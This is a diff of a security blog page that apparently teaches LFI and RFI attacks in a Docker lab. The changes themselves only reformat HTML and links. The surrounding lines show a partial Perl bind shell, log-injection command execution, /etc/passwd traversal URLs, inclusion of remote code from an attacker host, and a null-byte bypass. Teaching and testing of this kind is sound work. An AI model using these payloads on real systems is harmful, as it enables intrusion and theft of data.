@@ -85,10 +85,7 @@
 
 
 <!-- Page Header -->
-<header class="masthead"
-        
-style="background-image:url('/blog/assets/img/home-matrix.png')"
-        >
+<header class="masthead" style="background-image:url('/blog/assets/img/home-matrix.png')">
     <div class="overlay"></div>
     <div class="container">
         <div class="row">
@@ -121,12 +118,14 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
             <ul class="list-unstyled components">
                 <ul class="section-nav">
 <li class="toc-entry toc-h1"><a href="#introduction">Introduction</a></li>
-<li class="toc-entry toc-h1"><a href="#what-is-lfi--rfi-in-detail">What is LFI / RFI in detail?</a>
+<li class="toc-entry toc-h1">
+<a href="#what-is-lfi--rfi-in-detail">What is LFI / RFI in detail?</a>
 <ul>
 <li class="toc-entry toc-h2"><a href="#exercises">Exercises</a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h1"><a href="#why-is-it-so-dangerous">Why is it so dangerous?</a>
+<li class="toc-entry toc-h1">
+<a href="#why-is-it-so-dangerous">Why is it so dangerous?</a>
 <ul>
 <li class="toc-entry toc-h2"><a href="#read-access-lfi">Read access LFI</a></li>
 <li class="toc-entry toc-h2"><a href="#write-access-lfi">Write access LFI</a></li>
@@ -134,16 +133,21 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 </ul>
 </li>
 <li class="toc-entry toc-h1"><a href="#setting-up-a-test-environment">Setting up a test environment</a></li>
-<li class="toc-entry toc-h1"><a href="#linux-network">Linux network</a>
+<li class="toc-entry toc-h1">
+<a href="#linux-network">Linux network</a>
 <ul>
 <li class="toc-entry toc-h2"><a href="#starting-the-network">Starting the network</a></li>
-<li class="toc-entry toc-h2"><a href="#php">PHP</a>
+<li class="toc-entry toc-h2">
+<a href="#php">PHP</a>
 <ul>
-<li class="toc-entry toc-h3"><a href="#language-parameter">Language Parameter</a>
+<li class="toc-entry toc-h3">
+<a href="#language-parameter">Language Parameter</a>
 <ul>
-<li class="toc-entry toc-h4"><a href="#lfi">LFI</a>
+<li class="toc-entry toc-h4">
+<a href="#lfi">LFI</a>
 <ul>
-<li class="toc-entry toc-h5"><a href="#file-upload">File Upload</a>
+<li class="toc-entry toc-h5">
+<a href="#file-upload">File Upload</a>
 <ul>
 <li class="toc-entry toc-h6"><a href="#sanity-check-lfi">Sanity check lfi</a></li>
 <li class="toc-entry toc-h6"><a href="#getting-a-remote-shell">Getting a remote shell</a></li>
@@ -151,12 +155,14 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 </li>
 </ul>
 </li>
-<li class="toc-entry toc-h4"><a href="#log-injection">Log Injection</a>
+<li class="toc-entry toc-h4">
+<a href="#log-injection">Log Injection</a>
 <ul>
 <li class="toc-entry toc-h5"><a href="#getting-remote-code-execution">Getting remote code execution</a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h4"><a href="#rfi-1">RFI</a>
+<li class="toc-entry toc-h4">
+<a href="#rfi-1">RFI</a>
 <ul>
 <li class="toc-entry toc-h5"><a href="#php-configuration">PHP Configuration</a></li>
 <li class="toc-entry toc-h5"><a href="#exploiting-rfi">Exploiting RFI</a></li>
@@ -164,13 +170,15 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 </li>
 </ul>
 </li>
-<li class="toc-entry toc-h3"><a href="#page-parameter">Page Parameter</a>
+<li class="toc-entry toc-h3">
+<a href="#page-parameter">Page Parameter</a>
 <ul>
 <li class="toc-entry toc-h4"><a href="#etcpasswd">/etc/passwd</a></li>
 </ul>
 </li>
 <li class="toc-entry toc-h3"><a href="#not-included-in-demo-code">Not included in demo code</a></li>
-<li class="toc-entry toc-h3"><a href="#further-payloads">Further payloads</a>
+<li class="toc-entry toc-h3">
+<a href="#further-payloads">Further payloads</a>
 <ul>
 <li class="toc-entry toc-h4"><a href="#msfvenom">msfvenom</a></li>
 </ul>
@@ -178,9 +186,11 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 <li class="toc-entry toc-h3"><a href="#faulty-code">Faulty Code</a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h2"><a href="#jsp">JSP</a>
+<li class="toc-entry toc-h2">
+<a href="#jsp">JSP</a>
 <ul>
-<li class="toc-entry toc-h3"><a href="#lfi-1">LFI</a>
+<li class="toc-entry toc-h3">
+<a href="#lfi-1">LFI</a>
 <ul>
 <li class="toc-entry toc-h4"><a href="#help-parameter">Help Parameter</a></li>
 <li class="toc-entry toc-h4"><a href="#sanity-check-lfi-1">Sanity check lfi</a></li>
@@ -196,19 +206,24 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 <li class="toc-entry toc-h2"><a href="#exercises-1">Exercises</a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h1"><a href="#windows-network">Windows network</a>
+<li class="toc-entry toc-h1">
+<a href="#windows-network">Windows network</a>
 <ul>
 <li class="toc-entry toc-h2"><a href="#configuration-on-a-linux-system">Configuration on a Linux system</a></li>
 <li class="toc-entry toc-h2"><a href="#configuration-on-a-windows-system">Configuration on a Windows system</a></li>
 <li class="toc-entry toc-h2"><a href="#starting-the-network-1">Starting the network</a></li>
-<li class="toc-entry toc-h2"><a href="#asp">ASP</a>
+<li class="toc-entry toc-h2">
+<a href="#asp">ASP</a>
 <ul>
-<li class="toc-entry toc-h3"><a href="#lfi-2">LFI</a>
+<li class="toc-entry toc-h3">
+<a href="#lfi-2">LFI</a>
 <ul>
-<li class="toc-entry toc-h4"><a href="#test-parameter">Test Parameter</a>
+<li class="toc-entry toc-h4">
+<a href="#test-parameter">Test Parameter</a>
 <ul>
 <li class="toc-entry toc-h5"><a href="#sanity-check-lfi-2">Sanity check lfi</a></li>
-<li class="toc-entry toc-h5"><a href="#getting-remote-code-execution-2">Getting remote code execution</a>
+<li class="toc-entry toc-h5">
+<a href="#getting-remote-code-execution-2">Getting remote code execution</a>
 <ul>
 <li class="toc-entry toc-h6"><a href="#list-directory">List directory</a></li>
 <li class="toc-entry toc-h6"><a href="#powershell-version">Powershell version</a></li>
@@ -224,7 +239,8 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 </li>
 </ul>
 </li>
-<li class="toc-entry toc-h1"><a href="#mitigation">Mitigation</a>
+<li class="toc-entry toc-h1">
+<a href="#mitigation">Mitigation</a>
 <ul>
 <li class="toc-entry toc-h2"><a href="#blackbox-testing">Blackbox-Testing</a></li>
 <li class="toc-entry toc-h2"><a href="#whitebox-testing">Whitebox-Testing</a></li>
@@ -264,7 +280,7 @@ Web applications that are affected by such issues can often be owned relatively 
 
 <p>I try to accompany everything with exercises so that you can understand it easier.</p>
 
-<p>Everything coded here including all docker stuff can be found at <a href="https://github.com/secf00tprint/payloadtester_lfi_rfi">my github repo</a>.</p>
+<p>Everything coded here including all docker stuff can be found at <a href="https://github.com/secf00tprint/payloadtester_lfi_rfi" target="_blank" rel="noopener noreferrer">my github repo</a>.</p>
 
 <h1 id="what-is-lfi--rfi-in-detail">
 <a class="anchor" href="#what-is-lfi--rfi-in-detail" aria-hidden="true"><span class="octicon octicon-link"></span></a>What is LFI / RFI in detail?</h1>
@@ -1041,7 +1057,7 @@ Web applications that are affected by such issues can often be owned relatively 
         </g>
     </g>
 </svg>
-<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/">CC-by-sa-v3</a></p>
+<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed" target="_blank" rel="noopener noreferrer">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment" target="_blank" rel="noopener noreferrer">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/" target="_blank" rel="noopener noreferrer">CC-by-sa-v3</a></p>
 <p><button id="play1" type="button" class="btn btn-outline-primary btn-lg btn-block showlfibutton">Start</button></p>
 
 <p>The individual steps in detail:</p>
@@ -1151,14 +1167,14 @@ This indicates a local-file-inclusion vulnerability. Search another html file of
 <a class="anchor" href="#setting-up-a-test-environment" aria-hidden="true"><span class="octicon octicon-link"></span></a>Setting up a test environment</h1>
 
 <p>To reproduce the two security issues local on your system you can use the following github project:
-<a href="https://github.com/secf00tprint/payloadtester_lfi_rfi">https://github.com/secf00tprint/payloadtester_lfi_rfi</a></p>
+<a href="https://github.com/secf00tprint/payloadtester_lfi_rfi" target="_blank" rel="noopener noreferrer">https://github.com/secf00tprint/payloadtester_lfi_rfi</a></p>
 
 <p>To run it you need</p>
 
 <ul>
-  <li><a href="https://www.docker.com/">Docker</a></li>
+  <li><a href="https://www.docker.com/" target="_blank" rel="noopener noreferrer">Docker</a></li>
   <li>
-<a href="https://git-scm.com/">Git</a> and</li>
+<a href="https://git-scm.com/" target="_blank" rel="noopener noreferrer">Git</a> and</li>
 </ul>
 
 <p>First you have to clone the project:</p>
@@ -1176,14 +1192,14 @@ This indicates a local-file-inclusion vulnerability. Search another html file of
 <p>Therefore it is good if you have installed and downloaded:</p>
 
 <ul>
-  <li><a href="https://www.virtualbox.org/">VirtualBox</a></li>
-  <li><a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">Kali VM for VirtualBox</a></li>
+  <li><a href="https://www.virtualbox.org/" target="_blank" rel="noopener noreferrer">VirtualBox</a></li>
+  <li><a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/" target="_blank" rel="noopener noreferrer">Kali VM for VirtualBox</a></li>
 </ul>
 
 <p>The Linux server infrastructure consists of:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/lfirfi_infrastructure.svg" alt="LFI / RFI Linux Infrastructure" width="100%"></p>
-<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/">CC-by-sa-v3</a>, <a href="https://www.iconfinder.com/iconsets/kameleon-free-pack">Kameleon Free Pack</a></p>
+<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed" target="_blank" rel="noopener noreferrer">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment" target="_blank" rel="noopener noreferrer">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/" target="_blank" rel="noopener noreferrer">CC-by-sa-v3</a>, <a href="https://www.iconfinder.com/iconsets/kameleon-free-pack" target="_blank" rel="noopener noreferrer">Kameleon Free Pack</a></p>
 
 <h2 id="starting-the-network">
 <a class="anchor" href="#starting-the-network" aria-hidden="true"><span class="octicon octicon-link"></span></a>Starting the network</h2>
@@ -1207,8 +1223,8 @@ victim.lfi.jsp.tld       | starting server on: external: 127.0.0.1:8881 - intern
 victim.lfi.php.tld       | starting server on: external: 127.0.0.1:8883 - internal: 172.18.0.4:80
 </code></pre>
 
-<p>So for example the victim php server can be reached on your local computer at <a href="http://127.0.0.1:8883">http://127.0.0.1:8883</a> and 
-inside the Linux docker network at <a href="http://172.18.0.4:80">http://172.18.0.4:80</a> or using name resolution at <a href="http://victim.lfi.php.tld:80">http://victim.lfi.php.tld:80</a>.</p>
+<p>So for example the victim php server can be reached on your local computer at <a href="http://127.0.0.1:8883" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883</a> and 
+inside the Linux docker network at <a href="http://172.18.0.4:80" target="_blank" rel="noopener noreferrer">http://172.18.0.4:80</a> or using name resolution at <a href="http://victim.lfi.php.tld:80" target="_blank" rel="noopener noreferrer">http://victim.lfi.php.tld:80</a>.</p>
 
 <p>I will now show some examples of LFI / RFI in two programming languages PHP and JSP.</p>
 
@@ -1219,11 +1235,11 @@ inside the Linux docker network at <a href="http://172.18.0.4:80">http://172.18.
 
 <p>If you run the Linux network you can go to</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php">http://127.0.0.1:8883/lfi.php</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php</a></p>
 
-<p>Here we have 2 vulnerable query parameters: <code class="highlighter-rouge">language</code> and <code class="highlighter-rouge">page</code>.</p>
+<p>Here we have 2 vulnerable query parameters: <code class="language-plaintext highlighter-rouge">language</code> and <code class="language-plaintext highlighter-rouge">page</code>.</p>
 
-<p>I will handle both parameters, in the next section first with <code class="highlighter-rouge">language</code>:</p>
+<p>I will handle both parameters, in the next section first with <code class="language-plaintext highlighter-rouge">language</code>:</p>
 
 <h3 id="language-parameter">
 <a class="anchor" href="#language-parameter" aria-hidden="true"><span class="octicon octicon-link"></span></a>Language Parameter</h3>
@@ -1236,14 +1252,14 @@ inside the Linux docker network at <a href="http://172.18.0.4:80">http://172.18.
 
 <p>The application allows the upload of files. Furthermore if you upload a file you can see where the file is stored:</p>
 
-<p>On <a href="http://127.0.0.1:8883/lfi.php">http://127.0.0.1:8883/lfi.php</a> you can choose between different languages. Everytime you switch you can see that the language is set in the url:</p>
+<p>On <a href="http://127.0.0.1:8883/lfi.php" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php</a> you can choose between different languages. Everytime you switch you can see that the language is set in the url:</p>
 
 <ul>
-  <li><a href="http://127.0.0.1:8883/lfi.php?language=english">http://127.0.0.1:8883/lfi.php?language=english</a></li>
-  <li><a href="http://127.0.0.1:8883/lfi.php?language=melay">http://127.0.0.1:8883/lfi.php?language=melay</a></li>
+  <li><a href="http://127.0.0.1:8883/lfi.php?language=english" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=english</a></li>
+  <li><a href="http://127.0.0.1:8883/lfi.php?language=melay" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=melay</a></li>
 </ul>
 
-<p>It seem’s that the PHP code is just setting an <code class="highlighter-rouge">.php</code> file postfix at the end.</p>
+<p>It seem’s that the PHP code is just setting an <code class="language-plaintext highlighter-rouge">.php</code> file postfix at the end.</p>
 
 <h6 id="sanity-check-lfi">
 <a class="anchor" href="#sanity-check-lfi" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sanity check lfi</h6>
@@ -1256,7 +1272,7 @@ inside the Linux docker network at <a href="http://172.18.0.4:80">http://172.18.
   phpinfo();
 </code></pre>
 
-<p>and upload it. After that, call <a href="http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check">http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check</a></p>
+<p>and upload it. After that, call <a href="http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check</a></p>
 
 <p>Bingo! You have currenty insight into the php configuration of the victim server!</p>
 
@@ -1286,11 +1302,11 @@ SOMAXCONN);for (;accept(NEW_SOCKET,SOCKET);close NEW_SOCKET){open(STDIN,
 </code></pre>
 
 <p>This creates a <strong>Bind Shell</strong> - it opens a possible connection where you can connect to as attacker. 
-The connection is open for everybody (<code class="highlighter-rouge">0.0.0.0</code>) and listens on port <code class="highlighter-rouge">4444</code>.</p>
+The connection is open for everybody (<code class="language-plaintext highlighter-rouge">0.0.0.0</code>) and listens on port <code class="language-plaintext highlighter-rouge">4444</code>.</p>
 
 <p>Upload the file on the victim server and execute it by opening it:</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell">http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell</a></p>
 
 <p>You should now be able to connect to the server.</p>
 
@@ -2521,7 +2537,7 @@ RK5CYII=" height="81" preserveaspectratio="none"></image>
     </g>
   </g>
 </svg>
-<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/">CC-by-sa-v3</a>, <a href="https://www.iconfinder.com/iconsets/geosm-e-commerce">Logs Search - Geosm E-Commerce 18px</a>, <a href="https://www.iconfinder.com/iconsets/kameleon-free-pack">Kameleon Free Pack</a></p>
+<p class="foto_creds" style="font-size:0.5em">Created with <a href="https://www.yworks.com/products/yed" target="_blank" rel="noopener noreferrer">yEd</a>. Icon credits to: <a href="https://www.vrt.com.au/downloads/vrt-network-equipment" target="_blank" rel="noopener noreferrer">VRT</a> <a href="https://creativecommons.org/licenses/by-sa/3.0/de/" target="_blank" rel="noopener noreferrer">CC-by-sa-v3</a>, <a href="https://www.iconfinder.com/iconsets/geosm-e-commerce" target="_blank" rel="noopener noreferrer">Logs Search - Geosm E-Commerce 18px</a>, <a href="https://www.iconfinder.com/iconsets/kameleon-free-pack" target="_blank" rel="noopener noreferrer">Kameleon Free Pack</a></p>
 <p><button id="play2" type="button" class="btn btn-outline-primary btn-lg btn-block showlfi_loginjectionbutton">Start</button></p>
 
 <h5 id="getting-remote-code-execution">
@@ -2556,23 +2572,23 @@ Content-Type: text/html; charset=iso-8859-1
 
 <p>It doesn’t matter because you’re only interested in getting the code into the logs.</p>
 
-<p>Now try to access the <code class="highlighter-rouge">access.log</code> where you should have just written into.</p>
+<p>Now try to access the <code class="language-plaintext highlighter-rouge">access.log</code> where you should have just written into.</p>
 
-<p>In this example the <code class="highlighter-rouge">access.log</code> is named <code class="highlighter-rouge">access_combined.log</code>.</p>
+<p>In this example the <code class="language-plaintext highlighter-rouge">access.log</code> is named <code class="language-plaintext highlighter-rouge">access_combined.log</code>.</p>
 
 <p>Result:</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log">http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log</a></p>
 
 <p>opens the log file.</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_accesslog.png" alt="PHP Access Log" width="100%"></p>
 
-<p>The PHP code allows you to use the parameter <code class="highlighter-rouge">cmd</code> to give a shell command, which is then executed and displayed via <code class="highlighter-rouge">echo</code>.</p>
+<p>The PHP code allows you to use the parameter <code class="language-plaintext highlighter-rouge">cmd</code> to give a shell command, which is then executed and displayed via <code class="language-plaintext highlighter-rouge">echo</code>.</p>
 
 <p>So let’s find out which Linux system the server is running on.</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&amp;cmd=uname%20-a">http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&amp;cmd=uname -a</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&amp;cmd=uname%20-a" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&amp;cmd=uname -a</a></p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_access_loginjection_uname.png" alt="PHP Access Log" width="100%"></p>
 
@@ -2582,24 +2598,24 @@ Content-Type: text/html; charset=iso-8859-1
 <h5 id="php-configuration">
 <a class="anchor" href="#php-configuration" aria-hidden="true"><span class="octicon octicon-link"></span></a>PHP Configuration</h5>
 
-<p>You can use the <code class="highlighter-rouge">check.php</code> <a href="http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check">http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check</a> lfi to go to the next level:</p>
+<p>You can use the <code class="language-plaintext highlighter-rouge">check.php</code> <a href="http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check</a> lfi to go to the next level:</p>
 
-<p>Search for <code class="highlighter-rouge">allow_url</code> on the site.</p>
+<p>Search for <code class="language-plaintext highlighter-rouge">allow_url</code> on the site.</p>
 
 <p>One of the first findings should be:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_allowurl.png" alt="PHP allow url parameters" width="100%"></p>
 
-<p>These 2 parameters, <code class="highlighter-rouge">allow_url_fopen</code> and <code class="highlighter-rouge">allow_url_include</code>, are set to <code class="highlighter-rouge">Off</code> by default.</p>
+<p>These 2 parameters, <code class="language-plaintext highlighter-rouge">allow_url_fopen</code> and <code class="language-plaintext highlighter-rouge">allow_url_include</code>, are set to <code class="language-plaintext highlighter-rouge">Off</code> by default.</p>
 
 <p>If they are enabled they Remote File Inclusion is possible if the site has RFI security issues, otherwise 
 RFI wouldn’t be possible:</p>
 
 <ul>
   <li>
-<code class="highlighter-rouge">allow_url_fopen</code> to <code class="highlighter-rouge">On</code> makes it possible to open files by url in the code.</li>
+<code class="language-plaintext highlighter-rouge">allow_url_fopen</code> to <code class="language-plaintext highlighter-rouge">On</code> makes it possible to open files by url in the code.</li>
   <li>
-<code class="highlighter-rouge">allow_url_include</code> permits the programmer to include an external url inside his code.</li>
+<code class="language-plaintext highlighter-rouge">allow_url_include</code> permits the programmer to include an external url inside his code.</li>
 </ul>
 
 <h5 id="exploiting-rfi">
@@ -2607,10 +2623,10 @@ RFI wouldn’t be possible:</p>
 
 <p>So now you can attack with a Remote File Inclusion:</p>
 
-<p>Try to get to execute <code class="highlighter-rouge">check.php</code>, but the file from your attacker server rather than from the victim server should be loaded 
+<p>Try to get to execute <code class="language-plaintext highlighter-rouge">check.php</code>, but the file from your attacker server rather than from the victim server should be loaded 
 by the victim application.</p>
 
-<p>Our attacker server has the following file: <a href="http://127.0.0.1:8884/check.php">http://127.0.0.1:8884/check.php</a>.</p>
+<p>Our attacker server has the following file: <a href="http://127.0.0.1:8884/check.php" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8884/check.php</a>.</p>
 
 <p>We will set this as the value for the language key. And, we have to use the IP inside the docker network for the attacker server,
 which can be picked from the docker logs:</p>
@@ -2619,41 +2635,41 @@ which can be picked from the docker logs:</p>
 
 <p>The first attempt could be:</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?">http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php</a></p>
 
 <p>But this won’t work because the postfix ‘.php’ is appended.</p>
 
-<p>It will become: <code class="highlighter-rouge">http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php.php</code></p>
+<p>It will become: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php.php</code></p>
 
 <p>There are 2 solutions:</p>
 
-<p>Either, we rename our php file to <code class="highlighter-rouge">check.php.php</code>, then it will work</p>
+<p>Either, we rename our php file to <code class="language-plaintext highlighter-rouge">check.php.php</code>, then it will work</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_check_phpphp.png" alt="check php php" width="100%"></p>
 
-<p>or we use a question mark at the end of our call: <code class="highlighter-rouge">http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?</code></p>
+<p>or we use a question mark at the end of our call: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?</code></p>
 
-<p>Then <code class="highlighter-rouge">http://attacker.lfi.php.tld/check.php?.php</code> would be called on the attacker server, which executes <code class="highlighter-rouge">check.php</code> and discards 
-the <code class="highlighter-rouge">.php</code> part.</p>
+<p>Then <code class="language-plaintext highlighter-rouge">http://attacker.lfi.php.tld/check.php?.php</code> would be called on the attacker server, which executes <code class="language-plaintext highlighter-rouge">check.php</code> and discards 
+the <code class="language-plaintext highlighter-rouge">.php</code> part.</p>
 
 <p>So a possible verify attack could be:</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?language=http://172.18.0.5/check.php?">http://127.0.0.1:8883/lfi.php?language=http://172.18.0.5/check.php?</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?language=http://172.18.0.5/check.php?" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=http://172.18.0.5/check.php?</a></p>
 
 <p>or</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?">http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=http://attacker.lfi.php.tld/check.php?</a></p>
 
-<p>which load <code class="highlighter-rouge">check.php</code> from the attacker server, include the code on the victim server and execute it there.</p>
+<p>which load <code class="language-plaintext highlighter-rouge">check.php</code> from the attacker server, include the code on the victim server and execute it there.</p>
 
 <h3 id="page-parameter">
 <a class="anchor" href="#page-parameter" aria-hidden="true"><span class="octicon octicon-link"></span></a>Page Parameter</h3>
 
-<p>The second of the both url parameters that is vulnerable is <code class="highlighter-rouge">page</code>.</p>
+<p>The second of the both url parameters that is vulnerable is <code class="language-plaintext highlighter-rouge">page</code>.</p>
 
 <p>This time no file ending is automatically appended.</p>
 
-<p>You can verify the vulnerability for example using <a href="http://127.0.0.1:8883/lfi.php?page=check.php">http://127.0.0.1:8883/lfi.php?page=check.php</a><br>
+<p>You can verify the vulnerability for example using <a href="http://127.0.0.1:8883/lfi.php?page=check.php" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?page=check.php</a><br>
 if you have already uploaded check.php:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_check_pageparam.png" alt="PHP Check accessable using page param" width="100%"></p>
@@ -2663,21 +2679,21 @@ if you have already uploaded check.php:</p>
 
 <p>Since an extension is not appended automatically, we can now try to get files other than PHP.</p>
 
-<p>So let’s try to integrate <code class="highlighter-rouge">/etc/passwd</code>. This is possible both absolutely and relatively.</p>
+<p>So let’s try to integrate <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. This is possible both absolutely and relatively.</p>
 
 <p><strong>absolutely</strong>:</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?page=/etc/passwd">http://127.0.0.1:8883/lfi.php?page=/etc/passwd</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?page=/etc/passwd" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?page=/etc/passwd</a></p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_read_etc_passwd_absolut.png" alt="PHP Read /etc/passwd absolutely" width="100%"></p>
 
 <p><strong>relatively</strong>:</p>
 
-<p>Here you have to try out. Start with <code class="highlighter-rouge">../etc/passwd</code> and add further <code class="highlighter-rouge">../</code>.</p>
+<p>Here you have to try out. Start with <code class="language-plaintext highlighter-rouge">../etc/passwd</code> and add further <code class="language-plaintext highlighter-rouge">../</code>.</p>
 
 <p>In this application it is three times:</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd">http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd</a></p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_read_etc_passwd_rel.png" alt="PHP Read /etc/passwd relatively" width="100%"></p>
 
@@ -2690,17 +2706,17 @@ if you have already uploaded check.php:</p>
 
 <p>This allowed the automatic appending of a string to an input to be bypassed, since the null byte character indicates the end of the string and the PHP interpreter assumes that now nothing follows and discards the rest of the string.</p>
 
-<p>Example <code class="highlighter-rouge">language</code> parameter:</p>
+<p>Example <code class="language-plaintext highlighter-rouge">language</code> parameter:</p>
 
-<p>Here the file extension <code class="highlighter-rouge">.php</code> is appended to the input.</p>
+<p>Here the file extension <code class="language-plaintext highlighter-rouge">.php</code> is appended to the input.</p>
 
-<p>With the following call you could open a file <code class="highlighter-rouge">foo.txt</code> in the current folder:</p>
+<p>With the following call you could open a file <code class="language-plaintext highlighter-rouge">foo.txt</code> in the current folder:</p>
 
-<p><a href="http://127.0.0.1:8883/lfi.php?language=foo.txt%00">http://127.0.0.1:8883/lfi.php?language=foo.txt%00</a></p>
+<p><a href="http://127.0.0.1:8883/lfi.php?language=foo.txt%00" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8883/lfi.php?language=foo.txt%00</a></p>
 
-<p>The string complete string is <code class="highlighter-rouge">foo.txt%00.php</code>. Since <code class="highlighter-rouge">%00</code> indicates the end of the string only <code class="highlighter-rouge">foo.txt</code> would be stored from the php interpreter.</p>
+<p>The string complete string is <code class="language-plaintext highlighter-rouge">foo.txt%00.php</code>. Since <code class="language-plaintext highlighter-rouge">%00</code> indicates the end of the string only <code class="language-plaintext highlighter-rouge">foo.txt</code> would be stored from the php interpreter.</p>
 
-<p>However, the use of zero bytes is no longer possible since <a href="https://secure.php.net/manual/en/security.filesystem.nullbytes.php">PHP version 5.3</a>.
+<p>However, the use of zero bytes is no longer possible since <a href="https://secure.php.net/manual/en/security.filesystem.nullbytes.php" target="_blank" rel="noopener noreferrer">PHP version 5.3</a>.
 So this attack isn’t possible any more since then.</p>
 
 <h3 id="further-payloads">
